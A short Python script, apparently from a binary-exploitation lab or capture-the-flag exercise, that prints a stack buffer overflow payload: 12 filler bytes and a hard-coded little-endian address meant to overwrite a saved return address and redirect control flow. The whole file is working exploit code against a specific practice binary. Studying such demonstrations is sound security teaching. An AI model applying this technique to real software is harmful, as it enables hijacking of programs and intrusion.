#!/usr/bin/env python3

"""
Return Address Overwrite Demonstration
--------------------------------------

This script demonstrates how a stack buffer overflow can overwrite
a saved return address and redirect control flow to an attacker-
controlled function.
"""

# 0x0000000000401e46 address
# rbp-0x4 buf in relation to rbp
# 0x0000000000401ee8 return address that points to the next instruction
import sys

sys.stdout.buffer.write(b"A" * 12 + 0x401e46.to_bytes(8, "little"))
